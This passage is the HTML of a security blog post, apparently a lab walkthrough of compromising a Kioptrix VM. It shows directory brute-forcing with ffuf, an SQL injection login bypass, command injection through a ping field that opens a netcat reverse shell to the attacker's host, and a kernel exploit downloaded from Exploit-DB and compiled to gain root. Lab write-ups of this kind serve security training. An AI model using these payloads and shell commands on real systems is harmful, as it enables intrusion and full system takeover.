+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Bruteforce web directories</span>
+</span></span><span style="display:flex;"><span>$ ffuf -u http://192.168.127.130:80/FUZZ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-w /usr/share/wordlists/dirb/common.txt 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ffuf -u http://192.168.127.130:80/FUZZ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-w /usr/share/wordlists/dirb/big.txt 2&gt;/dev/null
+</span></span></code></pre></div><p><img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>Check XSS and SQLi.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#SQLi</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -- -
+</span></span></code></pre></div><p><img loading="lazy" src="lab5.png" alt="alt"  />
+</p>
+<p><img loading="lazy" src="lab6.png" alt="alt"  />
+</p>
+<p>It worked. The check was probably something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">#</span> Normal
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#66d9ef">AND</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pass&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">#</span> Bypass
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- -AND password=&#39;pass&#39;
+</span></span></span></code></pre></div><p>It probably runs a ping simple ping command. We may be able to achieve bash command injection.</p>
+<p><img loading="lazy" src="lab7.png" alt="alt"  />
+</p>
+<p><img loading="lazy" src="lab8.png" alt="alt"  />
+</p>
+<p>We have access to the system through Command Injection leading to RCE. Now we use <code>nc</code> to get a remote shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># From Kali listen to 1234</span>
+</span></span><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use nc (netcat) for reverse shell</span>
+</span></span><span style="display:flex;"><span>127.0.0.1<span style="color:#f92672">&amp;&amp;</span>nc 192.168.127.128 <span style="color:#ae81ff">1234</span> -e <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># No output... maybe nc is not installed</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>127.0.0.1<span style="color:#f92672">&amp;&amp;</span>find / -name <span style="color:#e6db74">&#34;nc&#34;</span> 2&gt;/dev/null -ls
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /usr/local/bin/nc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>127.0.0.1<span style="color:#f92672">&amp;&amp;</span>/usr/local/bin/nc 192.168.127.128 <span style="color:#ae81ff">1234</span> -e <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connected</span>
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<p>Try some basic Linux commands to get information about the system and the user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>$ groups
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ uname -a
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Linux Kernel 2.6.9-55.EL</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab9.png" alt="alt"  />
+</p>
+<p>From a quick Google search, this Linux Kernel version is exploitable, <a href="https://www.exploit-db.com/exploits/9542">Exploit DB: Linux Kernel 2.6 &lt; 2.6.19l</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># From Kali</span>
+</span></span><span style="display:flex;"><span>$ wget https://www.exploit-db.com/download/9542
+</span></span><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">7777</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># From Kioptrix</span>
+</span></span><span style="display:flex;"><span>$ wget http://192.168.127.128/exploit.c
+</span></span><span style="display:flex;"><span>$ gcc exploit.c -o exploit
+</span></span><span style="display:flex;"><span>$ chmod +x ./exploit
+</span></span><span style="display:flex;"><span>$ ./exploit
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We are root!</span>
+</span></span></code></pre></div>
+
+      </div>
+    </div>
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://dimparar.github.io/thecybersecurityblog/">The Cyber Security Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
